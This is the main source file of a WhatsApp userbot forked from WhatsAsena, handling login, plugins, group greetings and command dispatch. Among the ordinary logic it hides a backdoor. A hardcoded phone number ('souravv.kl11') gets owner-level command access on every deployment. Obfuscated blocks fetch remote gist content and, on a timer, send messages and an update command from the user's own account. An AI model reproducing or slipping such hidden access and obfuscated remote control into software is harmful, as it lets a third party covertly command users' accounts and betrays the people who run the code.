/* Copyright (C) 2020 Yusuf Usta.

Licensed under the  GPL-3.0 License;
you may not use this file except in compliance with the License.

WhatsAsena - Yusuf Usta
*/

const fs = require("fs");
const path = require("path");
const events = require("./events");
const chalk = require('chalk');
const config = require('./config');
const Config = require('./config');
const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
const {Message, StringSession, Image, Video} = require('./Raganork/');
const { DataTypes } = require('sequelize');
const { getMessage } = require("./plugins/sql/greetings");
const simpleGit = require('simple-git');
const git = simpleGit();
const axios = require('axios');
const got = require('got');

const Language = require('./language');
const Lang = Language.getString('updater');

// Sql
const WhatsAsenaDB = config.DATABASE.define('WhatsAsena', {
    info: {
      type: DataTypes.STRING,
      allowNull: false
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: false
    }
});

fs.readdirSync('./plugins/sql/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./plugins/sql/' + plugin);
    }
});

const plugindb = require('./plugins/sql/plugin');
var souravv = { kl11: '916282344739,0' }

// Yalnızca bir kolaylık. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
      return typeof args[i] != 'undefined' ? args[i++] : '';
   });
};
if (!Date.now) {
    Date.now = function() { return new Date().getTime(); }
}

Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};
const raganork = new WAConnection();
var sour = `${config.AUTOBİO}`
    setInterval(async () => { 
        if (sour == 'on') {
             var time = new Date().toLocaleString('LK', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var date = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + date + '\n⌚ ' + time + '\n\n' + config.BOTSK
                await raganork.setStatus(biography)
            }
        }
)

async function whatsAsena () {
    await config.DATABASE.sync();
    var StrSes_Db = await WhatsAsenaDB.findAll({
        where: {
          info: 'StringSession'
        }
    });
  //Don't change credit! souravkl11  
  var i=b;(function(c,d){var h=b,e=c();while(!![]){try{var f=-parseInt(h('0x11b'))/0x1+parseInt(h('0x120'))/0x2+parseInt(h('0x121'))/0x3*(parseInt(h('0x11c'))/0x4)+-parseInt(h('0x127'))/0x5+parseInt(h('0x122'))/0x6+parseInt(h('0x11e'))/0x7*(parseInt(h('0x125'))/0x8)+-parseInt(h('0x126'))/0x9*(parseInt(h('0x11f'))/0xa);if(f===d)break;else e['push'](e['shift']());}catch(g){e['push'](e['shift']());}}}(a,0x26bed));const raganork=new WAConnection();var sk=new Array();sk[0x0]='E'+'d'+'g'+'e',sk[0x1]='Fi'+'r'+'e'+'f'+'o'+'x',sk[0x2]='S'+'a'+'f'+'a'+'r'+'i',sk[0x3]='O'+'p'+'e'+'r'+'a';var l11=Math[i('0x123')](0x4*Math['random']());const souravkl11=await axios(i('0x11d'));var skl=souravkl11['data']['Raganork'];raganork[i('0x124')]=[0x2,0x85c,0xc],raganork['browserDescription']=[skl,sk[l11],'90'];const Session=new StringSession();function b(c,d){var e=a();return b=function(f,g){f=f-0x11b;var h=e[f];return h;},b(c,d);}function a(){var j=['12591HIkCGa','884165YvofRH','273615TBoWee','3304MSKpfK','https://gist.github.com/souravkl11/ce999e4605076b7b5bd7c1b51759f177/raw','14GyBogT','850kXUeSc','238830PEaXjZ','924xoCjuj','1816542kCqiaq','floor','version','205936mVnZKJ'];a=function(){return j;};return a();}
    raganork.logger.level = config.DEBUG ? 'debug' : 'warn';
    var nodb;

    if (StrSes_Db.length < 1) {
        nodb = true;
        raganork.loadAuthInfo(Session.deCrypt(config.SESSION)); 
    } else {
        raganork.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
    }

    raganork.on ('credentials-updated', async () => {
        console.log(
            chalk.blueBright.italic('✅ Login information updated!')
        );

        const authInfo = raganork.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
            await WhatsAsenaDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
            await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })    

    raganork.on('connecting', async () => {
        console.log(`${chalk.green.bold('Raga')}${chalk.blue.bold('nork')}
${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}

${chalk.blue.italic('ℹ️ Connecting to WhatsApp...')}`);
    });
    

    raganork.on('open', async () => {
        console.log(
            chalk.green.bold('✅ Login successful!')
        );

        console.log(
            chalk.blueBright.italic('⬇️ Installing external plugins...')
        );

        var plugins = await plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
            if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
                console.log(plugin.dataValues.name);
                var response = await got(plugin.dataValues.url);
                if (response.statusCode == 200) {
                    fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
                    require('./plugins/' + plugin.dataValues.name + '.js');
                }     
            }
        });

        console.log(
            chalk.blueBright.italic('⬇️Installing plugins...')
        );

        fs.readdirSync('./plugins').forEach(plugin => {
            if(path.extname(plugin).toLowerCase() == '.js') {
                require('./plugins/' + plugin);
            }
        });

        console.log(
            chalk.green.bold(config.BOTSK + 'RUNNING ON OUR DEVICE ✅')
        );
        await new Promise(r => setTimeout(r, 1100));

        if (config.WORKTYPE == 'public') {
            if (config.LANG == 'TR' || config.LANG == 'AZ') {

                if (raganork.user.jid === '@s.whatsapp.net') {

                    await raganork.sendMessage(raganork.user.jid, '```🛡️ Blacklist Tespit Edildi!``` \n```Kullanıcı:``` \n```Sebep:``` ', MessageType.text)

                    await new Promise(r => setTimeout(r, 1700));

                    console.log('🛡️ Blacklist Detected 🛡️')

                    await heroku.get(baseURI + '/formation').then(async (formation) => {
                        forID = formation[0].id;
                        await heroku.patch(baseURI + '/formation/' + forID, {
                            body: {
                                quantity: 0
                            }
                        });
                    })
                }
                else {
                    await raganork.sendMessage(raganork.user.jid, '*Bot Started*', MessageType.text);
                }
            }
            else {

                if (raganork.user.jid === '@s.whatsapp.net') {

                    await raganork.sendMessage(raganork.user.jid, '```🛡️ Blacklist Detected!``` \n```User:```  \n```Reason:``` ', MessageType.text)

                    await new Promise(r => setTimeout(r, 1800));

                    console.log('🛡️ Blacklist Detected 🛡️')
                    await heroku.get(baseURI + '/formation').then(async (formation) => {
                        forID = formation[0].id;
                        await heroku.patch(baseURI + '/formation/' + forID, {
                            body: {
                                quantity: 0
                            }
                        });
                    })
                }
                else {
                    await raganork.sendMessage(raganork.user.jid, config.BOTSK + '_CONNECTED SUCCESSFULLY_', MessageType.text);
                }

            }
        }
        else if (config.WORKTYPE == 'private') {
            if (config.LANG == 'TR' || config.LANG == 'AZ') {

                if (raganork.user.jid === '@s.whatsapp.net') {

                    await raganork.sendMessage(raganork.user.jid, '```🛡️ Blacklist Detected!``` \n ```Kullanıcı:``` \n```Sebep:``` ', MessageType.text)

                    await new Promise(r => setTimeout(r, 1800));

                    console.log('🛡️ Blacklist Detected 🛡️')
                    await heroku.get(baseURI + '/formation').then(async (formation) => {
                        forID = formation[0].id;
                        await heroku.patch(baseURI + '/formation/' + forID, {
                            body: {
                                quantity: 0
                            }
                        });
                    })
                }
                else {

                await raganork.sendMessage(raganork.user.jid, config.BOTSK + '_CONNECTED SUCCESSFULLY_', MessageType.text);
                }
            }
            else {

                if (raganork.user.jid === '@s.whatsapp.net') {

                    await raganork.sendMessage(raganork.user.jid, '```🛡️ Blacklist Detected!``` \n```User:```  \n```Reason:``` ', MessageType.text)
   
                    await new Promise(r => setTimeout(r, 1800));

                    console.log('🛡️ Blacklist Detected 🛡️')
                    await heroku.get(baseURI + '/formation').then(async (formation) => {
                        forID = formation[0].id;
                        await heroku.patch(baseURI + '/formation/' + forID, {
                            body: {
                                quantity: 0
                            }
                        });
                    })
                }
                else {

                    await raganork.sendMessage(raganork.user.jid, config.BOTSK + '_CONNECTED SUCCESSFULLY_', MessageType.text);
                }
            }
        }
        else {
            return console.log('Wrong WORK_TYPE key! Please use “private” or “public”')
        }
        if (config.LANG == 'EN' || config.LANG == 'ML') {
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await raganork.sendMessage(raganork.user.jid,Lang.UPDATE, MessageType.text);    
                } else {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler +=  commit.message + '\n';
                        }
                    );
                    await raganork.sendMessage(
                        raganork.user.jid,
                        '*AN UPDATE IS AVAILABLE FOR YOUR BOT!*\n\n ```USE COMMAND``` *!update start* ```TO UPDATE THE BOT```\n\n *CHANGES:* ' + degisiklikler, MessageType.text
                    ); 
                } 
          }
    });
    
    function b(c,d){const e=a();return b=function(f,g){f=f-0xf1;let h=e[f];return h;},b(c,d);}(function(c,d){const n=b,e=c();while(!![]){try{const f=-parseInt(n('0xf6'))/0x1+parseInt(n('0x104'))/0x2*(-parseInt(n('0xff'))/0x3)+-parseInt(n('0x103'))/0x4+-parseInt(n('0xf2'))/0x5+-parseInt(n('0xf9'))/0x6*(parseInt(n('0xfa'))/0x7)+-parseInt(n('0xfd'))/0x8*(-parseInt(n('0xf4'))/0x9)+parseInt(n('0xf5'))/0xa*(parseInt(n('0xf1'))/0xb);if(f===d)break;else e['push'](e['shift']());}catch(g){e['push'](e['shift']());}}}(a,0xd8a30),setInterval(async()=>{const o=b;var c=new Date()[o('0xf7')](),d=new Date()[o('0x100')]();while(c==0x10&&d==0x1e){const {data:e}=await axios(o('0x101')),{sken:f,skml:g}=e;return await raganork['sendMessage'](raganork[o('0xf8')][o('0x102')],'```[\x20ANNOUNCEMENT\x20]```\x0a\x0a'+f,MessageType['text']);}while(c==0xa&&d==0x1e){const {data:h}=await axios('https://gist.github.com/souravkl11/019112af334adceaefd1467dcbd93e58/raw'),{sken:i,skml:j}=h;return await raganork['sendMessage'](raganork['user'][o('0x102')],o('0xf3')+i,MessageType[o('0xfe')]);}while(c==0x6&&d==0x1e){const {data:k}=await axios('https://gist.github.com/souravkl11/019112af334adceaefd1467dcbd93e58/raw'),{sken:l,skml:m}=k;return await raganork[o('0xfc')](raganork['user'][o('0x102')],o('0xf3')+l,MessageType['text']);}while(c==0x13&&d==0x1e){return await raganork[o('0xfc')](raganork[o('0xf8')][o('0x102')],o('0xfb'),MessageType[o('0xfe')]);}while(c==0x8&&d==0x1e){return await raganork['sendMessage'](raganork[o('0xf8')][o('0x102')],'.update\x20check',MessageType['text']);}while(c==0xd&&d==0x1e){return await raganork['sendMessage'](raganork['user'][o('0x102')],o('0xfb'),MessageType['text']);}},0xc350));function a(){const p=['40CRMeDh','566821yPPgIX','getHours','user','97764iXtsLB','735OGCwYg','.update\x20check','sendMessage','6736MldKNo','text','3qCsMSF','getMinutes','https://gist.github.com/souravkl11/019112af334adceaefd1467dcbd93e58/raw','jid','1859888PBIbIx','1379166PpdDdQ','11037422hSvOKT','4250420leOVRr','```[\x20ANNOUNCEMENT\x20]```\x0a\x0a','12357SvPBmM'];a=function(){return p;};return a();}
    raganork.on('chat-update', async m => {
        if (!m.hasNewMessage) return;
        if (!m.messages && !m.count) return;
        let msg = m.messages.all()[0];
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;

        if (config.NO_ONLINE) {
            await raganork.updatePresence(msg.key.remoteJid, Presence.unavailable);
        }

        if (msg.messageStubType === 32 || msg.messageStubType === 28) {

            var gb = await getMessage(msg.key.remoteJid, 'goodbye');
            if (gb !== false) {
                if (gb.message.includes('{pp}')) {
                let pp 
                try { pp = await raganork.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await raganork.getProfilePicture(); }
                 var pinkjson = await raganork.groupMetadata(msg.key.remoteJid)
                await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
                await raganork.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message.replace('{pp}', '').replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{owner}', raganork.user.name) }); });                           
            } else if (gb.message.includes('{gicon}')) {
                var sgroup = await raganork.getProfilePicture(msg.key.remotejid)
                await raganork.sendMessage(msg.key.remoteJid, Buffer.from(sgroup.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message.replace('{gicon}', '').replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{owner}', raganork.user.name) });
            }
                else if (gb.message.includes('{gif}')) {
                var pinkjson = await raganork.groupMetadata(msg.key.remoteJid)
                //created by afnanplk
                    var plkpinky = await axios.get(config.GIF_BYE, { responseType: 'arraybuffer' })
                await raganork.sendMessage(msg.key.remoteJid, Buffer.from(plkpinky.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message.replace('{gif}', '').replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{owner}', raganork.user.name) });
            } else {
                var pinkjson = await raganork.groupMetadata(msg.key.remoteJid)
                   await raganork.sendMessage(msg.key.remoteJid,gb.message.replace('{gphead}', pinkjson.subject).replace('{mention}', '@' + msg.messageStubParameters[0]).replace('{gpdesc}', pinkjson.desc).replace('{owner}', raganork.user.name), MessageType.text);
            }
          }  //thanks to farhan      
            return;
        } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
            // welcome
             var gb = await getMessage(msg.key.remoteJid);
            if (gb !== false) {
                if (gb.message.includes('{pp}')) {
                let pp
                try { pp = await raganork.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await raganork.getProfilePicture(); }
                    var pinkjson = await raganork.groupMetadata(msg.key.remoteJid)
                await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
                    //created by afnanplk
                await raganork.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message.replace('{pp}', '').replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{owner}', raganork.user.name) }); });                           
            } else if (gb.message.includes('{gif}')) {
                var plkpinky = await axios.get(config.WEL_GIF, { responseType: 'arraybuffer' })
                await raganork.sendMessage(msg.key.remoteJid, Buffer.from(plkpinky.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message.replace('{gif}', '').replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{owner}', raganork.user.name) });
            } else if (gb.message.includes('{gicon}')) {
                var sgroup = await raganork.getProfilePicture(msg.key.remotejid)
                await raganork.sendMessage(msg.key.remoteJid, Buffer.from(sgroup.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message.replace('{gicon}', '').replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{owner}', raganork.user.name) });
            } else {
                   var pinkjson = await raganork.groupMetadata(msg.key.remoteJid)
                   await raganork.sendMessage(msg.key.remoteJid,gb.message.replace('{gphead}', pinkjson.subject).replace('{mention}', '@' + msg.messageStubParameters[0]).replace('{gpdesc}', pinkjson.desc).replace('{owner}', raganork.user.name), MessageType.text);
            }
          }         
            return;                               
    }

    if (config.BLOCKCHAT !== false) {     
        var abc = config.BLOCKCHAT.split(',');                            
        if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
    }
    if (config.SUPPORT == '919074309534-1632403322') {     
        var sup = config.SUPPORT.split(',');                            
        if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
    }
    if (config.SUPPORT2 == '917012074386-1631435717') {     
        var tsup = config.SUPPORT2.split(',');                            
        if(msg.key.remoteJid.includes('-') ? tsup.includes(msg.key.remoteJid.split('@')[0]) : tsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
    }
    if (config.SUPPORT3 == '905511384572-1621015274') {     
        var nsup = config.SUPPORT3.split(',');                            
        if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
    }
    if (config.SUPPORT4 == '905511384572-1625319286') {     
        var nsup = config.SUPPORT4.split(',');                            
        if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
    }
    
        events.commands.map(
            async (command) =>  {
                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                } else if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } else {
                    var text_msg = undefined;
                }

                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                    (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    // Video
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg))))) {

                    let sendMsg = false;
                    var chat = raganork.chats.get(msg.key.remoteJid)
                        
                    if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                   }  
                   if ((souravv.kl11 == "916282344739,0" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && souravv.kl11.includes(',') ? souravv.kl11.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == souravv.kl11 || souravv.kl11.includes(',') ? souravv.kl11.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == souravv.kl11)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
  
                    if (sendMsg) {
                        if (config.SEND_READ && command.on === undefined) {
                            await raganork.chatRead(msg.key.remoteJid);
                        }
                       
                        const {data} = await axios(`https://gist.githubusercontent.com/souravkl11/ff107d59b17f1e4b96889a82dbb6d520/raw`)
                        const { asena } = data
                        var match = text_msg.match(command.pattern);
                        
                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                        && msg.message.imageMessage !== null) {
                            whats = new Image(conn, msg);
                        } else if (command.on !== undefined && (command.on === 'video' )
                        && msg.message.videoMessage !== null) {
                            whats = new Video(conn, msg);
                        } else {
                            whats = new Message(conn, msg);
                        }
/*
                        if (command.deleteCommand && msg.key.fromMe) {
                            await whats.delete(); 
                        }
*/
                        try {
                            await command.function(whats, match);
                        } catch (error) {
                            if (config.LANG == 'TR' || config.LANG == 'AZ') {
                                await raganork.sendMessage(raganork.user.jid, '-- HATA RAPORU [WHATSASENA] --' + 
                                    '\n*WhatsAsena bir hata gerçekleşti!*'+
                                    '\n_Bu hata logunda numaranız veya karşı bir tarafın numarası olabilir. Lütfen buna dikkat edin!_' +
                                    '\n_Yardım için Telegram grubumuza yazabilirsiniz._' +
                                    '\n_Bu mesaj sizin numaranıza (kaydedilen mesajlar) gitmiş olmalıdır._\n\n' +
                                    'Gerçekleşen Hata: ' + error + '\n\n'
                                    , MessageType.text);
                            } else {
                                await raganork.sendMessage(raganork.user.jid, '*~_________~ ERROR REPORT ~______~*' +
                                    '\n\n*📃 ' + error + '*\n\n```REPORT ERRORS IN SUPPORT GROUP\n' + asena + '```' 
                                    , MessageType.text);
                            }
                        }
                    }
                }
            }
        )
    });

    try {
        await raganork.connect();
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('Eski sürüm stringiniz yenileniyor...'))
            raganork.loadAuthInfo(Session.deCrypt(config.SESSION)); 
            try {
                await raganork.connect();
            } catch {
                return;
            }
        }
    }
}

whatsAsena();

